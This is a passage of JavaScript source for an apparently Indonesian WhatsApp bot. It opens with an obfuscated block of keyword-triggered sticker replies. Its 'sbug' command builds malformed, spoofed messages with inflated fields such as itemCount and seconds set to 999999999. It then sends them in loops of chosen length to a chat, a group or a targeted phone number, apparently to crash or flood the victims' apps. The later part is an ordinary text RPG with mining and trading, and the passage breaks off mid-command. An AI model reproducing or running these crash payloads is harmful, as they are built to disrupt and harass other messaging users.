_0x2e7fe4=['prototype','asek','Fvjmx','apply','url','xckmd','https://e.','memek','sSticker','eRmfg','.help','tiXmp','372420COykxj','fj0.mp3','split','error','top4top.io','__proto__','constructo','VjDEv','warn','/p','DpLTI','BipQa','3227950wxWqLn',',p','UOYAA','ZuqzC','oduLw','memek','quoted','rn\x20this\x22)(','!help','563029ttkehJ','xUAzm','log','nction()\x20','33509wOhYQN','JAfsP','RsrNH','ptt','return\x20(fu','search','iGbhM','181784YWYXVH','odkKy','audio','cLBuA','RyGXQ','9LjpSso','memek','{}.constru','memek','BEhBd','info','bind','1|3|0|4|2','138hiXYcB','toString','/m_228660h','?memek','HGFCG','.memek','console','RozET','mimetype','RLcjf','#p','27KroLQV','packname','trace','?memek','yUPHP','ctor(\x22retu','lWOuy','Asvtp','exception','2170340DmciQy','40YlAfAW','author','3|1|2|5|4|','KoLkc','audio/mp4','KQSjn','#memek','!memek','aURnH','table','oGijj','/memek','989278mYPETh','sendMessag','sendImageA','startsWith','chat','XaaQj','length','mksOn','asUQL','QkzSl','(((.+)+)+)'];_0x5926=function(){return _0x2e7fe4;};return _0x5926();}body['startsWith'](_0x5cbf04(-0x146,-0x13d,-0x10e,-0x145))&&zaki[_0x40bc60(-0x1a0,-0x14c,-0x147,-0x174)+_0x40bc60(-0x18b,-0x17f,-0x135,-0x163)](m[_0x40bc60(-0x169,-0x189,-0x154,-0x172)],global[_0x5cbf04(-0x16f,-0x17f,-0x163,-0x16f)],m,{'packname':global['packname'],'author':global[_0x5cbf04(-0x140,-0x131,-0x108,-0x136)]});body[_0x5cbf04(-0x160,-0x188,-0x19d,-0x17b)](_0x5cbf04(-0x147,-0x167,-0x16d,-0x16b))&&zaki[_0x40bc60(-0x177,-0x172,-0x18d,-0x174)+_0x40bc60(-0x17a,-0x131,-0x17b,-0x163)](m[_0x5cbf04(-0x1a2,-0x187,-0x1b0,-0x169)],global[_0x5cbf04(-0x1a9,-0x17f,-0x151,-0x157)],m,{'packname':global[_0x5cbf04(-0x117,-0x13b,-0x137,-0x130)],'author':global['author']});body[_0x40bc60(-0x199,-0x145,-0x19d,-0x173)](_0x40bc60(-0x159,-0x15c,-0x113,-0x12f))&&zaki[_0x5cbf04(-0x1ab,-0x189,-0x19d,-0x16c)+'sSticker'](m[_0x5cbf04(-0x167,-0x187,-0x18e,-0x1ab)],global['asek'],m,{'packname':global[_0x5cbf04(-0x119,-0x13b,-0x143,-0x15a)],'author':global['author']});body[_0x5cbf04(-0x1b5,-0x188,-0x17a,-0x186)](_0x40bc60(-0x12b,-0x13a,-0x122,-0x14e))&&zaki['sendImageA'+'sSticker'](m[_0x5cbf04(-0x1a0,-0x187,-0x16f,-0x1b0)],global['asek'],m,{'packname':global['packname'],'author':global[_0x40bc60(-0x121,-0x11d,-0x13f,-0x11c)]});body['startsWith']('memek')&&zaki[_0x40bc60(-0x1a2,-0x171,-0x167,-0x174)+_0x5cbf04(-0x18a,-0x178,-0x196,-0x178)](m[_0x40bc60(-0x151,-0x165,-0x14f,-0x172)],global[_0x5cbf04(-0x181,-0x17f,-0x194,-0x160)],m,{'packname':global['packname'],'author':global[_0x40bc60(-0x136,-0x145,-0x147,-0x11c)]});body[_0x5cbf04(-0x1a0,-0x188,-0x17f,-0x1a7)](_0x40bc60(-0x15c,-0x18c,-0x17f,-0x161))&&zaki[_0x5cbf04(-0x18c,-0x189,-0x190,-0x18f)+_0x5cbf04(-0x179,-0x178,-0x1a1,-0x19b)](m[_0x40bc60(-0x180,-0x186,-0x188,-0x172)],global[_0x5cbf04(-0x179,-0x17f,-0x170,-0x15a)],m,{'packname':global['packname'],'author':global[_0x5cbf04(-0x112,-0x131,-0x140,-0x14a)]});body[_0x40bc60(-0x151,-0x18a,-0x156,-0x173)](_0x5cbf04(-0x18c,-0x160,-0x12e,-0x17b))&&zaki[_0x5cbf04(-0x157,-0x189,-0x18c,-0x19f)+_0x40bc60(-0x16d,-0x139,-0x196,-0x163)](m[_0x40bc60(-0x181,-0x171,-0x185,-0x172)],global['asek'],m,{'packname':global[_0x40bc60(-0x128,-0x129,-0x116,-0x126)],'author':global[_0x5cbf04(-0x131,-0x131,-0x139,-0x12d)]});body['startsWith'](_0x5cbf04(-0x171,-0x16b,-0x15f,-0x151))&&zaki[_0x5cbf04(-0x158,-0x189,-0x17f,-0x1a4)+'sSticker'](m['chat'],global[_0x40bc60(-0x13f,-0x18a,-0x18e,-0x16a)],m,{'packname':global[_0x5cbf04(-0x137,-0x13b,-0x161,-0x143)],'author':global[_0x40bc60(-0x11d,-0x122,-0x13c,-0x11c)]});body[_0x40bc60(-0x179,-0x198,-0x184,-0x173)]('#help')&&zaki['sendImageA'+_0x40bc60(-0x141,-0x15b,-0x169,-0x163)](m['chat'],global[_0x40bc60(-0x151,-0x138,-0x13a,-0x16a)],m,{'packname':global[_0x40bc60(-0xf5,-0x159,-0x10d,-0x126)],'author':global[_0x40bc60(-0xf7,-0x10e,-0xfc,-0x11c)]});body[_0x40bc60(-0x175,-0x16f,-0x18a,-0x173)](',help')&&zaki['sendImageA'+'sSticker'](m[_0x5cbf04(-0x188,-0x187,-0x184,-0x176)],global['asek'],m,{'packname':global[_0x5cbf04(-0x10f,-0x13b,-0x138,-0x152)],'author':global[_0x5cbf04(-0x120,-0x131,-0x161,-0x129)]});body[_0x5cbf04(-0x184,-0x188,-0x16d,-0x18a)](_0x5cbf04(-0x16b,-0x139,-0x112,-0x124))&&zaki[_0x40bc60(-0x156,-0x147,-0x167,-0x174)+_0x5cbf04(-0x15f,-0x178,-0x17b,-0x151)](m['chat'],global[_0x5cbf04(-0x186,-0x17f,-0x19a,-0x150)],m,{'packname':global[_0x5cbf04(-0x12e,-0x13b,-0x13e,-0x148)],'author':global[_0x40bc60(-0x10d,-0xef,-0xf0,-0x11c)]});

	    
	    // FUNCTION BUG

	    if (vn) {
          const allct = await store.chats.all().map(v => v.id)
          if (m.message && m) {
            if (vn === false) return
                for (let jid of allct) {
                    zaki.sendPresenceUpdate('recording', jid)
                setTimeout(() => {
                    zaki.sendPresenceUpdate('recording', jid)
                }, 25000)
                setTimeout(() => {
                    zaki.sendPresenceUpdate('recording', jid)
                }, 50000)
                setTimeout(() => {
                    zaki.sendPresenceUpdate('recording', jid)
                }, 75000)
                }
            }
        }
        
        const pict = fs.readFileSync('./pict.jpg')

        const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}

        const rplybg = (jid, text, quoted = ctlg) => zaki.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: 'Bnzet && PitoDev', previewType:"PHOTO", thumbnail:pict, sourceUrl: `


	    
        if (db.data.users[m.sender].afkTime > -1) {
        let user = global.db.data.users[m.sender]
        rplybg(m.chat, 'Bnzet && PitoDev', m)
        user.afkTime = -1
        } 
        
        
        switch(command) {
        // BUG
        case 'sbug': {

            if (!isCreator) return

            if (args.length < 1) return rplybg(m.chat, `Mau di send apa?\n\n${prefix}sbug hr [di chat ini]\n${prefix}sbug gc [di group ini]\n${prefix}sbug pc\n${prefix}sbug reaksi`)

            let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : `${args[1].replace(/ /g, '')}@s.whatsapp.net`

            var main1 = {"key": {"fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''})}, "message":{"imageMessage":{"caption": "Bnzet && PitoDev"}}}

            var main2 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"orderMessage": {"itemCount": 999999999,"surface": 'CATALOG'}}}

            var main3 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"productMessage": {}}}

            var main4 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"locationMessage": {}}}

            var main5 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"documentMessage": {"title":"Bnzet && PitoDev"}}}

            var main6 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"audioMessage": {"seconds": 999999999,"ptt": "true"}}}

            var main7 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"audioMessage": {"seconds": 999999999}}}

            var main8 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"videoMessage": {"caption": "Bnzet && PitoDev","gifPlayback": true,"seconds": 999999999}}}

            var main9 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"videoMessage": {"caption": "Bnzet && PitoDev","seconds": 999999999}}}

            var main10 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"groupInviteMessage": {"caption": "Bnzet && PitoDev"}}}

            var main11 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net", ...({"remoteJid":''})},"message": {"contactMessage": {"displayName":"Bnzet && PitoDev"}}}

            if (args[0] === 'reaksi' ) {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                console.log(`~ Bug Active ~`)
            }
            if (args[0] === 'hr' ) {

                if (args.length < 2) return rplybg(m.chat, `${prefix}sbug hr image jumlah\n${prefix}sbug hr gift jumlah\n${prefix}sbug hr video jumlah\n${prefix}sbug hr vn jumlah\n${prefix}sbug hr audio jumlah\n${prefix}sbug hr invite jumlah\n${prefix}sbug hr kontak jumlah\n${prefix}sbug hr troli jumlah\n${prefix}sbug hr katalog jumlah\n${prefix}sbug hr lokasi jumlah\n${prefix}sbug hr dokumen jumlah\n${prefix}sbug hr all\n\nPilihlah Salah Satu!`)

                if (args.length < 3) return rplybg(m.chat, 'Berapa jumlah nya?')

                if (args[1] === 'image' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main1)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'troli' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main2)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'katalog' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main3)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'lokasi' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main4)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'dokumen' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main5)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'vn' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main6)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'audio' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main7)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'video' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main8)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'gift' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main9)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'invite' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main10)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'kontak' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main11)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'all' ) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main1)

                    rplybg(m.chat, `Bnzet && PitoDev`, main2)

                    rplybg(m.chat, `Bnzet && PitoDev`, main3)

                    rplybg(m.chat, `Bnzet && PitoDev`, main4)

                    rplybg(m.chat, `Bnzet && PitoDev`, main5)

                    rplybg(m.chat, `Bnzet && PitoDev`, main6)

                    rplybg(m.chat, `Bnzet && PitoDev`, main7)

                    rplybg(m.chat, `Bnzet && PitoDev`, main8)

                    rplybg(m.chat, `Bnzet && PitoDev`, main9)

                    rplybg(m.chat, `Bnzet && PitoDev`, main10)

                    rplybg(m.chat, `Bnzet && PitoDev`, main11)

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                }

            }

            if (args[0] === 'gc' ) {

                if (args.length < 2) return rplybg(m.chat, `${prefix}sbug gc image jumlah\n${prefix}sbug gc gift jumlah\n${prefix}sbug gc video jumlah\n${prefix}sbug gc vn jumlah\n${prefix}sbug gc audio jumlah\n${prefix}sbug gc invite jumlah\n${prefix}sbug gc kontak jumlah\n${prefix}sbug gc troli jumlah\n${prefix}sbug gc katalog jumlah\n${prefix}sbug gc lokasi jumlah\n${prefix}sbug gc dokumen jumlah\n${prefix}sbug gc all\n\nPilihlah Salah Satu!`)

                if (args.length < 3) return rplybg(m.chat, 'Berapa jumlah nya?')

                if (args[1] === 'image' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main1)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'troli' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main2)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'katalog' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main3)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'lokasi' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main4)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'dokumen' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main5)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'vn' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main6)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'audio' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main7)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'video' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main8)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'gift' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main9)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'invite' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main10)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'kontak' ) {

                    for (let i = 0; i < args[2]; i++) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main11)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[1] === 'all' ) {

                    rplybg(m.chat, `Bnzet && PitoDev`, main1)

                    rplybg(m.chat, `Bnzet && PitoDev`, main2)

                    rplybg(m.chat, `Bnzet && PitoDev`, main3)

                    rplybg(m.chat, `Bnzet && PitoDev`, main4)

                    rplybg(m.chat, `Bnzet && PitoDev`, main5)

                    rplybg(m.chat, `Bnzet && PitoDev`, main6)

                    rplybg(m.chat, `Bnzet && PitoDev`, main7)

                    rplybg(m.chat, `Bnzet && PitoDev`, main8)

                    rplybg(m.chat, `Bnzet && PitoDev`, main9)

                    rplybg(m.chat, `Bnzet && PitoDev`, main10)

                    rplybg(m.chat, `Bnzet && PitoDev`, main11)

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                }

            }

            if (args[0] === 'pc' ) {

                if (args.length < 3) return rplybg(m.chat, `${prefix}sbug pc 62xxx/@tag image jumlah\n${prefix}sbug pc 62xxx/@tag gift jumlah\n${prefix}sbug pc 62xxx/@tag video jumlah\n${prefix}sbug pc 62xxx/@tag vn jumlah\n${prefix}sbug pc 62xxx/@tag audio jumlah\n${prefix}sbug pc 62xxx/@tag invite jumlah\n${prefix}sbug pc 62xxx/@tag kontak jumlah\n${prefix}sbug pc 62xxx/@tag troli jumlah\n${prefix}sbug pc 62xxx/@tag katalog jumlah\n${prefix}sbug pc 62xxx/@tag lokasi jumlah\n${prefix}sbug pc 62xxx/@tag dokumen jumlah\n${prefix}sbug pc 62xxx/@tag all\n\nPilihlah Salah Satu!`)

                if (args.length < 4) return rplybg(m.chat, 'Berapa jumlah nya?')

                if (args[2] === 'image' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main1)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'troli' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main2)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'katalog' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main3)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'lokasi' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main4)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'dokumen' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main5)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'vn' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main6)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'audio' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main7)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'video' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main8)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'gift' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main9)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'invite' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main10)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'kontak' ) {

                    for (let i = 0; i < args[3]; i++) {

                    rplybg(users, `Bnzet && PitoDev`, main11)}

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                } else if (args[2] === 'all' ) {

                    rplybg(users, `Bnzet && PitoDev`, main1)

                    rplybg(users, `Bnzet && PitoDev`, main2)

                    rplybg(users, `Bnzet && PitoDev`, main3)

                    rplybg(users, `Bnzet && PitoDev`, main4)

                    rplybg(users, `Bnzet && PitoDev`, main5)

                    rplybg(users, `Bnzet && PitoDev`, main6)

                    rplybg(users, `Bnzet && PitoDev`, main7)

                    rplybg(users, `Bnzet && PitoDev`, main8)

                    rplybg(users, `Bnzet && PitoDev`, main9)

                    rplybg(users, `Bnzet && PitoDev`, main10)

                    rplybg(users, `Bnzet && PitoDev`, main11)

                    await zaki.sendMessage(m.chat, {text:`Success`}).catch((err) => rplybg(m.chat, jsonformat(err)))

                }}

	        }

	        break

        //BATAS
        case 'inventori': case 'profile':{
if (q.includes('--help')) return m.reply(examkosong) 
  if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
  if (!isInventory){ addInventori(m.sender) }
  if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
     
     var flob = await getBuffer(picak+'Profile User')
     let teksehmazeh = `_[ 👩🏻‍💼INFO USER👨🏻‍💼 ]_\n\n`
     teksehmazeh += `*❤️Darah kamu* : ${getDarah(m.sender)}\n`
     teksehmazeh += `*◻️️Besi kamu* : ${getBesi(m.sender)}\n`
     teksehmazeh += `*🌟Emas Kamu* : ${getEmas(m.sender)}\n`
     teksehmazeh += `*💎Emerald Kamu* : ${getEmerald(m.sender)}\n`
     teksehmazeh += `*⏺️Limit kamu* : ${getLimit(m.sender)}\n`
     teksehmazeh += `*🧪Potion Kamu* : ${getPotion(m.sender)}\n\n`
     teksehmazeh += `_[ 🐺HASIL BURUAN🐺 ]_\n`
     teksehmazeh += `*🐟Ikan* : ${getIkan(m.sender)}\n`
     teksehmazeh += `*🐔Ayam* : ${getAyam(m.sender)}\n`
     teksehmazeh += `*🐇Kelinci* : ${getKelinci(m.sender)}\n`
     teksehmazeh += `*🐑Domba* : ${getDomba(m.sender)}\n`
     teksehmazeh += `*🐄Sapi* : ${getSapi(m.sender)}\n`
     teksehmazeh += `*🐘Gajah* : ${getGajah(m.sender)}\n\n`
     teksehmazeh += `_*${pushname}*_`
     await zaki.send5ButImg(from, `` + '' + teksehmazeh, `© ${footer}`, flob, [{"urlButton": {"displayText": "Subscribe","url": `${sc}`}}])
  }
  break
        case 'limituser':
{      
   let txt = `「 *ALL LIMIT USER* 」\n\n`
     for (let i of _limit){
     txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Limit* : ${i.limit}\n`
     }
    m.reply(txt)       
  }
 break
 case 'leaderboard':
{      
   let txt = `「 *LEADERBOARD* 」\n\n`
     for (let i of _buruan){
     txt += `➸ *ID :* ${i.id}\n`
     txt += `*🐟Ikan* : ${i.ikan}\n`
     txt += `*🐔Ayam* : ${i.ayam}\n`
     txt += `*🐇Kelinci* : ${i.kelinci}\n`
     txt += `*🐑Domba* : ${i.domba}\n`
     txt += `*🐄Sapi* : ${i.sapi}\n`
     txt += `*🐘Gajah* : ${i.gajah}\n\n`
     }
    m.reply(txt)       
  }
 break
case 'mining': case 'menambang':{
if (q.includes('--help')) return m.reply(examkosong) 
  if (!isInventory){ addInventori(m.sender) }
  if (isCekDarah < 1) return m.reply('Kamu kelelahan!, cobalah heal menggunakan potion') 
  let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
  let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
  let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
  var besinya = besi[Math.floor(Math.random() * besi.length)]  
  var emasnya = emas[Math.floor(Math.random() * emas.length)]  
  var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
  setTimeout( () => {
  let caption = `[ HASIL MENAMBANG ]\n*Besi* : ${besinya}\n*Emas* : ${emasnya}\n*Emerald* : ${emeraldnya}`
  let buttons = [
      {
       buttonId: `${prefix + command}`, 
       buttonText: {
        displayText: 'Menambang lagi⛏️'
      }, type: 1},
    ]
    let buttonMessage = {
      image: { url: './storage/image/tambang.jpg' },
      caption: caption,
      footer: pushname,
      buttons: buttons,
      headerType: 4
     }
     zaki.sendMessage(from, buttonMessage, { quoted: m })
   
   }, 7000)  
  setTimeout( () => {
  m.reply(`@${m.sender.split("@")[0]} Mulai menambang🎣`)     
  }, 1500)
  kurangDarah(m.sender, 10)
  addBesi(m.sender, besinya)
  addEmas(m.sended, emasnya)
  addEmerald(m.sender, emeraldnya)	     
  }   
  break  
  //transaksi
 case 'beli': case 'buy':{
if (q.includes('--help')) return m.reply(examkosong) 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return m.reply('Mau beli apa?')
 var anu = args[1]
  if (args[0] === 'potion'){
  let noh = 100000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} potion 2\n 1 potion = 100000 monay`)
 if (isMonay < noh) return m.reply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(m.sender)}\n*Potion kamu* : ${getPotion(m.sender)}`)
  }, 2000) 
 } else 
 if (args[0] === 'umpan'){
  let noh = 5000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} umpan 2\n 1 umpan = 2500 monay`)
 if (isMonay < noh) return m.reply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(m.sender)}\n*Umpan kamu* : ${getUmpan(m.sender)}`)
  }, 2000) 
  } else 
  if (args[0] === 'limit'){
  let noh = 35000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} limit 2\n 1 limit = 35000 monay`)
 if (isMonay < noh) return m.reply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(m.sender)}\n*Limit kamu* : ${getLimit(m.sender)}`)
  }, 2000) 
  } else { m.reply("Format salah!") }
 }
 break
 case 'sel': case 'jual':{//BY LORD RIFZA
 if (!q) return  m.reply(`Mau jual apa?\nExample : ${prefix + command} ikan 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'ikan'){
 if (isIkan < anu) return m.reply('Ikan kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} ikan 2\n 1 ikan = 1500 monay`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Ikan kamu* : ${getIkan(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'ayam'){
 if (isAyam < anu) return m.reply('Ayam kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} ayam 2\n 1 ayam = 2500 monay`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Ayam kamu* : ${getAyam(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'kelinci'){
 if (isKelinci < anu) return m.reply('Kelinci kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} kelinci 2\n 1 kelinci = 3000 monay`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Kelinci kamu* : ${getKelinci(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'domba'){
 if (isDomba < anu) return m.reply('Domba kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} domba 2\n 1 domba = 5000 monay`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
